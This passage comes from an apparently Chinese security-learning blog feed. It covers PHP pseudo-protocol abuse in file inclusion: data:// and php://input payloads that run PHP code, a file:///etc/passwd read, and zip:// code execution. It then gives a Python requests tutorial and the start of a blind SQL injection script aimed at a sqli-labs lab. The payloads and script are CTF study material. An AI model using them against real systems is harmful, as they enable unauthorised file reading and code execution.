class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><strong>范例</strong></p><p>Example #1 打印 data:// 的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 打印 &quot;I love PHP&quot;</span><br><span class="line">echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );</span><br><span class="line">//SSBsb3ZlIFBIUAo=解码后I love PHP</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Example #2 获取媒体类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp    =  fopen ( &#x27;data://text/plain;base64,&#x27; ,  &#x27;r&#x27; );</span><br><span class="line">$meta  =  stream_get_meta_data ( $fp );</span><br><span class="line"></span><br><span class="line">// 打印 &quot;text/plain&quot;</span><br><span class="line">echo  $meta [ &#x27;mediatype&#x27; ];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="3-file"><a class="markdownIt-Anchor" href="#3-file">#</a> 3、file://</h2><p>用于访问本地文件系统，并且不受 allow_url_fopen，allow_url_include 影响<br> file:// 协议主要用于访问文件 (绝对路径、相对路径以及网络路径)<br> 比如：<a href="http://www.xx.com?file=file:///etc/passsword">http://www.xx.com?file=file:///etc/passsword</a></p><h2 id="4-php"><a class="markdownIt-Anchor" href="#4-php">#</a> 4、php://</h2><p>在 allow_url_fopen，allow_url_include 都关闭的情况下可以正常使用<br> php:// 作用为访问输入输出流</p><h2 id="5-phpinput"><a class="markdownIt-Anchor" href="#5-phpinput">#</a> 5、php://input</h2><p>php://input 可以访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input, 同时 post 想设置的文件内容，php 执行时会将 post 内容当作文件内容。从而导致任意代码执行。</p><p>例如：<br><a href="http://127.0.0.1/cmd.php?cmd=php://input">http://127.0.0.1/cmd.php?cmd=php://input</a><br>POST 数据：<?php phpinfo()?><br>注意：<br>当 enctype=&quot;multipart/form-data&quot; 的时候 php://input` 是无效的</p><p>遇到 file_get_contents () 要想到用 php://input 绕过。</p><h2 id="6-zip"><a class="markdownIt-Anchor" href="#6-zip">#</a> 6、zip://</h2><p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip:// 流会被当作 php 文件执行。从而实现任意代码执行。</p><blockquote><p>zip:// 中只能传入绝对路径。<br>要用 #分隔压缩包和压缩包里的内容，并且 #要用 url 编码 %23（即下述 POC 中 #要用 %23 替换）<br>只需要是 zip 的压缩包即可，后缀名可以任意更改。<br>相同的类型的还有 zlib:// 和 bzip2://</p></blockquote><p><img src="/2023/04/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/01.png" class="lazyload" data-srcset="/2023/04/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前对 php 为协议有过初步的学习，但是学习的很拙劣，前几天 buu 刷题用到了 php 伪协议，所以打算重新学习一下&lt;/p&gt;</summary>
    
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/categories/ctfweb/"/>
    
    
    <category term="ctfweb" scheme="https://dr4x3zz.github.io/tags/ctfweb/"/>
    
  </entry>
  
  <entry>
    <title>python编写盲注脚本学习</title>
    <link href="https://dr4x3zz.github.io/2023/04/08/python%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://dr4x3zz.github.io/2023/04/08/python%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-04-07T16:09:57.000Z</published>
    <updated>2023-04-28T13:09:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下 python 写盲注脚本</p><span id="more"></span><h2 id="函数"><a class="markdownIt-Anchor" href="#函数">#</a> 函数</h2><h3 id="requests"><a class="markdownIt-Anchor" href="#requests">#</a> requests</h3><h4 id="python-requests-模块"><a class="markdownIt-Anchor" href="#python-requests-模块">#</a> Python requests 模块</h4><p>Python 内置了 requests 模块，该模块主要用来发 送 HTTP 请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 导入 requests 包</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 发送请求</span><br><span class="line">x = requests.get(&#x27;https://www.runoob.com/&#x27;)</span><br><span class="line"></span><br><span class="line"># 返回网页内容</span><br><span class="line">print(x.text)</span><br></pre></td></tr></table></figure><p>每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息。</p><p>具体学习连接：<a href="https://www.runoob.com/python3/python-requests.html">Python requests 模块 | 菜鸟教程 (runoob.com)</a></p><h4 id="python之-requests的get方法"><a class="markdownIt-Anchor" href="#python之-requests的get方法">#</a> Python 之 requests 的 get 方法</h4><p>requests.get () 完整形式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url,params=None,**kwargs)</span><br></pre></td></tr></table></figure><p>url: 想要获取的网页的链接。</p><p>params: url 的额外参数，字典或字节流格式，可选。</p><p>**kwargs: 13 个控制访问的参数。</p><p>例子：</p><p><img src="/2023/04/08/python%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/001.png" class="lazyload" data-srcset="/2023/04/08/python%E7%BC%96%E5%86%99%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/001.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>**kwargs 的详细参数如下：</p><table><thead><tr><th style="text-align:center"><strong>参数</strong></th><th style="text-align:center"><strong>作用</strong></th></tr></thead><tbody><tr><td style="text-align:center">params</td><td style="text-align:center">字典或字节序列，作为参数增加到 url 中</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">字典、字节序列或文件对象，作为 Request 的内容</td></tr><tr><td style="text-align:center">json</td><td style="text-align:center">JSON 格式的数据，作为 Request 的内容</td></tr><tr><td style="text-align:center">headers</td><td style="text-align:center">JSON 格式的数据，作为 Request 的内容</td></tr><tr><td style="text-align:center">cookies</td><td style="text-align:center">字典或 CookieJar, Request 中的 cookie</td></tr><tr><td style="text-align:center">auth</td><td style="text-align:center">字典或 CookieJar, Request 中的 cookie</td></tr><tr><td style="text-align:center">files</td><td style="text-align:center">字典类型，传输文件</td></tr><tr><td style="text-align:center">timeout</td><td style="text-align:center">设定超时时间，秒为单位</td></tr><tr><td style="text-align:center">proxies</td><td style="text-align:center">字典类型，设定访问代理服务器，可以增加登录认证</td></tr><tr><td style="text-align:center">allow_redirects</td><td style="text-align:center">True/False, 默认为 True, 重定向开关</td></tr><tr><td style="text-align:center">stream</td><td style="text-align:center">True/False, 默认为 True, 获取内容立即下载开关</td></tr><tr><td style="text-align:center">verify</td><td style="text-align:center">True/False, 默认为 True，认证 SSL 证书开关</td></tr><tr><td style="text-align:center">cert</td><td style="text-align:center">本地 SSL 证书路径</td></tr></tbody></table><h5 id="1-url请求的url地址必需"><a class="markdownIt-Anchor" href="#1-url请求的url地址必需">#</a> 1. url（请求的 url 地址，必需 ）</h5><ul><li>形式：字符串</li><li>意义：作为请求的<strong> url 地址</strong></li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import  requests</span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line">resp=requests.get(url)#向url对应的服务器发送相应的get请求，获得对应的相应 。</span><br></pre></td></tr></table></figure><h5 id="2-headers参数请求头可选"><a class="markdownIt-Anchor" href="#2-headers参数请求头可选">#</a> 2. headers 参数（请求头，可选）</h5><ul><li>形式：字典</li><li>意义：作为请求的<strong>请求头</strong></li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=r&quot;https://www.baidu.com/s&quot;</span><br><span class="line">Headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;</span><br><span class="line">         &#125;</span><br><span class="line">response=requests.get(url=url,headers=Headers)</span><br></pre></td></tr></table></figure><h5 id="3-params参数-请求参数可选"><a class="markdownIt-Anchor" href="#3-params参数-请求参数可选">#</a> 3. params 参数 （请求参数，可选）</h5><ul><li>形式：字典</li><li>意义：作为<strong> get 请求</strong>的<strong>表格信息</strong>，会被<strong>显式的加到 url</strong> 中</li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=r&quot;https://www.baidu.com/s&quot;</span><br><span class="line">#以带参数的Get请求，请求对应页面，比如百度搜索 Python，只需</span><br><span class="line">Params=&#123;&quot;wd&quot;:&quot;Python&quot;&#125;</span><br><span class="line">Headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;&#125;</span><br><span class="line">response=requests.get(url=url,params=Params,headers=Headers)</span><br><span class="line">print(response.request.url)#输出：https://www.baidu.com/s?wd=Python</span><br></pre></td></tr></table></figure><h5 id="4-proxies参数-代理ip可选"><a class="markdownIt-Anchor" href="#4-proxies参数-代理ip可选">#</a> 4. proxies 参数 （代理 IP，可选）</h5><ul><li>形式：字典</li><li>意义：作为用户代理，访问服务器会以<strong>该代理的 ip 访问服务器</strong>，可掩盖本机 ip.</li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">#proxies 是伪ip使用代理访问页面</span><br><span class="line">#下面是使用代理访问百度</span><br><span class="line">Headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Mobile Safari/537.36&quot;</span><br><span class="line">         &#125;</span><br><span class="line">#proxies的格式是字典，类型：协议表示+域名+端口</span><br><span class="line">proxies=&#123;</span><br><span class="line">    &quot;http&quot;:&quot;http://1.192.242.107:9999&quot;</span><br><span class="line">    # &quot;https&quot;:&quot;https://192.168.0.1:80&quot;</span><br><span class="line">&#125;</span><br><span class="line">url=&quot;https://www.baidu.com&quot;</span><br><span class="line">resp=requests.get(url,headers=Headers,proxies=proxies)</span><br><span class="line">print(resp.content.decode())</span><br></pre></td></tr></table></figure><h5 id="5-verify参数ssl证书验证可选"><a class="markdownIt-Anchor" href="#5-verify参数ssl证书验证可选">#</a> 5. verify 参数（ssl 证书验证，可选）</h5><ul><li>形式：bool 类型</li><li>意义：<strong>ssl 证书验证是否跳过</strong>，用于访问有些页面出现证书验证错误的时候</li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">当访问https页面出现证书错误，可以使用verify来取消验证</span><br><span class="line">在get或者post请求的verify参数设置成False</span><br><span class="line">requests.get(url,headers,data,prams,proxies,verify=False)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import requests</span><br><span class="line">url=&quot;https://www.12306.cn&quot;</span><br><span class="line">resp=requests.get(url,verify=False)</span><br><span class="line">print(resp.content.decode())</span><br></pre></td></tr></table></figure><h5 id="6-timeout参数-延迟限制可选"><a class="markdownIt-Anchor" href="#6-timeout参数-延迟限制可选">#</a> 6. timeout 参数 （延迟限制，可选）</h5><ul><li>形式：实数类型</li><li>意义：通过添加 timeout 参数，能够保证在指<strong>定秒钟内返回响应</strong>，<strong>否则会报错</strong></li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">超时参数的使用</span><br><span class="line">response = requests.get(url,timeout=3)通过添加timeout参数，能够保证在3秒钟内返回响应，否则会报错</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import  requests</span><br><span class="line">proxies=&#123;&quot;http&quot;:&quot;http://1.192.242.107:9999&quot;&#125;</span><br><span class="line">url=&quot;http://www.baidu.com&quot;</span><br><span class="line">try:</span><br><span class="line">    resp=requests.get(url,proxies=proxies,timeout=3)</span><br><span class="line">except :</span><br><span class="line">    print(&quot;运行时出错&quot;)</span><br></pre></td></tr></table></figure><h5 id="7-cookies参数-作为cookies可选"><a class="markdownIt-Anchor" href="#7-cookies参数-作为cookies可选">#</a> 7. cookies 参数 （作为 cookies，可选）</h5><ul><li>形式：字典</li><li>意义：使用该参数会<strong>显式将 cookies 字符串</strong>加入到请求头的 cookies 中</li><li>使用方法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#这里不再演示，cookies值本来是键值对，加入到headers中会处理为字符串加入到key对应的值中</span><br></pre></td></tr></table></figure><p>学习链接：</p><p><a href="https://blog.csdn.net/Dch19990825/article/details/87730252">(1 条消息) Python 之 requests 的 get 方法_python request.get_KetchupZ 的博客 - CSDN 博客</a></p><p><a href="https://blog.csdn.net/Abgler/article/details/80035657">(1 条消息) Python 网络爬虫与信息提取（二）**kwargs 参数详解_kwargs.get_zield 的博客 - CSDN 博客</a></p><h5 id="response"><a class="markdownIt-Anchor" href="#response">#</a> Response</h5><p>Response 对象的属性，有以下几种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">response=requests.get(&quot;http://www.baidu.com/&quot;)</span><br><span class="line">print(response)            #  &lt;Response [200]&gt;</span><br><span class="line">print(type(response))   # &lt;class &#x27;requests.models.Response&#x27;&gt;</span><br></pre></td></tr></table></figure><h6 id="1-responsestatus_code"><a class="markdownIt-Anchor" href="#1-responsestatus_code">#</a> 1、response.status_code</h6><p>http 请求的返回状态，2XX 表示连接成功，3XX 表示跳转，4XX 客户端错误，500 服务器错误</p><h6 id="2-responsetext"><a class="markdownIt-Anchor" href="#2-responsetext">#</a> 2、response.text</h6><p>http 响应内容的 <strong>字符串 (str)</strong> 形式，请求 url 对应的页面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(&quot;http://www.baidu.com/&quot;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p>打印出的内容含有乱码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># &lt;title&gt;ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“&lt;/title&gt;</span><br></pre></td></tr></table></figure><p>修改如下，改变下载得到的页面的编码，就可以正常打印出正常的文本了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.encoding=&quot;utf-8&quot;</span><br><span class="line">print(response.text)  # 打印文本中没有乱码</span><br></pre></td></tr></table></figure><p>更改编码要用到 response.encoding=“utf-8” 或者 response.encoding=”gbk”<br> 具体要看你请求的网页是用什么方式编码的，针对不同情况用对应的编码方式。</p><p>比如下面这个例子，不用编码也可以打印正常文本，如果你还是用 response.encoding=“utf-8”，以 utf-8 编码，反而会出现乱码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 没有乱码:</span></span><br><span class="line">response =requests.get(<span class="string">&quot;http://www.qq.com/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)   </span><br><span class="line"></span><br><span class="line">response =requests.get(<span class="string">&quot;http://www.qq.com/&quot;</span>)</span><br><span class="line">response.encoding=<span class="string">&quot;gbk&quot;</span>  </span><br><span class="line"><span class="built_in">print</span>(response.text)    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 有乱码:</span></span><br><span class="line">response =requests.get(<span class="string">&quot;http://www.qq.com/&quot;</span>)</span><br><span class="line">response.encoding=<span class="string">&quot;utf-8&quot;</span>  </span><br><span class="line"><span class="built_in">print</span>(response.text)    </span><br></pre></td></tr></table></figure><h6 id="3-responseencoding"><a class="markdownIt-Anchor" href="#3-responseencoding">#</a> 3、response.encoding</h6><p>从 HTTP header 中猜测的响应内容编码方式</p><h6 id="4-responseapparent_encoding"><a class="markdownIt-Anchor" href="#4-responseapparent_encoding">#</a> 4、 response.apparent_encoding</h6><p>从内容中分析出的响应内容编码方式（备选编码方式）</p><h6 id="5-responsecontent"><a class="markdownIt-Anchor" href="#5-responsecontent">#</a> 5、response.content</h6><p>HTTP 响应内容的二进制形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response =requests.get(&quot;http://www.baidu.com/&quot;)</span><br><span class="line"># print(response.content)     #打印出的是二进制形式</span><br><span class="line">print(response.content.decode(&quot;utf-8&quot;))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response =requests.get(&quot;http://www.qq.com/&quot;)</span><br><span class="line"># print(response.content)     #打印出的是二进制形式 </span><br><span class="line">print(response.content.decode(&quot;gbk&quot;))</span><br></pre></td></tr></table></figure><p>更改编码使用 response.content.deocde (“utf8”)<br> 更推荐使用 response.content.deocde () 的方式获取响应的 html 页面。</p><h6 id="6-responseheaders"><a class="markdownIt-Anchor" href="#6-responseheaders">#</a> 6、response.headers</h6><p>http 响应内容的头部内容</p><p>学习链接：</p><p><a href="https://blog.csdn.net/qq_31362767/article/details/81431124">(1 条消息) python 中的 requests,response.text 与 response.content 及其编码_&lt; 花开花落 &gt; 的博客 - CSDN 博客</a></p><h3 id="chri-for-i-in-range33-127"><a class="markdownIt-Anchor" href="#chri-for-i-in-range33-127">#</a> [chr(i) for i in range(33, 127)]</h3><h4 id="python-chr-函数"><a class="markdownIt-Anchor" href="#python-chr-函数">#</a> Python chr () 函数</h4><p>chr () 用一个范围在 range（256）内的（就是 0～255）整数作参数，返回一个对应的字符。</p><h4 id="python-range-函数用法"><a class="markdownIt-Anchor" href="#python-range-函数用法">#</a> Python range () 函数用法</h4><p>函数语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">range(start, stop[, step])</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>start: 计数从 start 开始。默认是从 0 开始。例如 range（5）等价于 range（0， 5）;</li><li>stop: 计数到 stop 结束，<strong>但不包括 stop</strong>。例如：range（0， 5） 是 [0, 1, 2, 3, 4] 没有 5</li><li>step：步长，默认为 1。例如：range（0， 5） 等价于 range (0, 5, 1)</li></ul><h4 id="联合使用"><a class="markdownIt-Anchor" href="#联合使用">#</a> 联合使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print [chr(i) for i in range(65,91)]#所有大写字母</span><br><span class="line">print [chr(i) for i in range(97,123)]#所有小写字母</span><br><span class="line">print [chr(i) for i in range(48,58)]#所有数字</span><br></pre></td></tr></table></figure><h3 id="python-find方法"><a class="markdownIt-Anchor" href="#python-find方法">#</a> Python find () 方法</h3><h4 id="描述"><a class="markdownIt-Anchor" href="#描述">#</a> 描述</h4><p>Python find () 方法检测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果包含子字符串返回开始的索引值，否则返回 - 1。</p><h4 id="语法"><a class="markdownIt-Anchor" href="#语法">#</a> 语法</h4><p>find () 方法语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.find(str, beg=0, end=len(string))</span><br></pre></td></tr></table></figure><ul><li>str – 指定检索的字符串</li><li>beg – 开始索引，默认为 0。</li><li>end – 结束索引，默认为字符串的长度</li></ul><h4 id="实例"><a class="markdownIt-Anchor" href="#实例">#</a> 实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"> </span><br><span class="line">str1 = &quot;this is string example....wow!!!&quot;;</span><br><span class="line">str2 = &quot;exam&quot;;</span><br><span class="line"> </span><br><span class="line">print str1.find(str2);</span><br><span class="line">print str1.find(str2, 10);</span><br><span class="line">print str1.find(str2, 40);</span><br></pre></td></tr></table></figure><p>以上实例输出结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">15</span><br><span class="line">15</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python/att-string-find.html">Python find () 方法 | 菜鸟教程 (runoob.com)</a></p><h3 id="python-str函数"><a class="markdownIt-Anchor" href="#python-str函数">#</a> Python str () 函数</h3><p>我们经常需要再消息中使用变量的值。例如，假设我们要祝人生日快乐，可能会编写类似下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age=20</span><br><span class="line">message=&quot;Happy &quot; + age + &quot;th Btrthday!&quot;</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure><p>但是如果运行这些代码，会引发错误。</p><p>在 Python 看来，age 这个变量表示的可能是数值 20，也可能是字符 2 和 0。因为 “+” 运算符两边的数据需要类型一致，因此像上面这样在字符串中使用整数时，需要显式地将这个整数用作字符串，让其与两侧的字符串数据类型保持一致。即调用 str () 函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age=20</span><br><span class="line">message=&quot;Happy &quot; + str(age) + &quot;th Birthday!&quot;</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出结果：Happy 20th Birthday!</span><br></pre></td></tr></table></figure><h3 id="python-list-append方法"><a class="markdownIt-Anchor" href="#python-list-append方法">#</a> Python List append () 方法</h3><h4 id="描述-2"><a class="markdownIt-Anchor" href="#描述-2">#</a> 描述</h4><p>append () 方法用于在列表末尾添加新的对象。</p><h4 id="语法-2"><a class="markdownIt-Anchor" href="#语法-2">#</a> 语法</h4><p>append () 方法语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list.append(obj)</span><br></pre></td></tr></table></figure><h4 id="参数"><a class="markdownIt-Anchor" href="#参数">#</a> 参数</h4><ul><li>obj – 添加到列表末尾的对象。</li></ul><h4 id="返回值"><a class="markdownIt-Anchor" href="#返回值">#</a> 返回值</h4><p>该方法无返回值，但是会修改原来的列表。</p><h4 id="实例-2"><a class="markdownIt-Anchor" href="#实例-2">#</a> 实例</h4><p>以下实例展示了 append () 函数的使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">aList = [123, &#x27;xyz&#x27;, &#x27;zara&#x27;, &#x27;abc&#x27;];</span><br><span class="line">aList.append( 2009 );</span><br><span class="line">print &quot;Updated List : &quot;, aList;</span><br></pre></td></tr></table></figure><p>以上实例输出结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Updated List :  [123, &#x27;xyz&#x27;, &#x27;zara&#x27;, &#x27;abc&#x27;, 2009]</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python/att-list-append.html">Python List append () 方法 | 菜鸟教程 (runoob.com)</a></p><h2 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码">#</a> 具体代码</h2><p>我自己写了一小部分的代码，没有用到二分法，后续自己在学习改进</p><p>这是 less07 盲注的部分代码，也是自己写的第一个盲注脚本记录一下，还是比较劣质，不够简洁和高效，继续积累慢慢学习</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.199.177/sqli-labs-php7-master/Less-7/&quot;</span>    <span class="comment">#有可利用漏洞的url</span></span><br><span class="line"></span><br><span class="line">keylist = [ <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>) ]     <span class="comment">#keylist表示所有字符和大小写字母，ascii码值为33-126的字符和字母</span></span><br><span class="line">flag = <span class="string">&#x27;You are in....&#x27;</span>                             <span class="comment">#用于判断附加sql语句为真的字符，根据网页回显填写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Database_length_name</span>():</span><br><span class="line">    <span class="comment">#length</span></span><br><span class="line">    db_len = <span class="number">1</span></span><br><span class="line">    <span 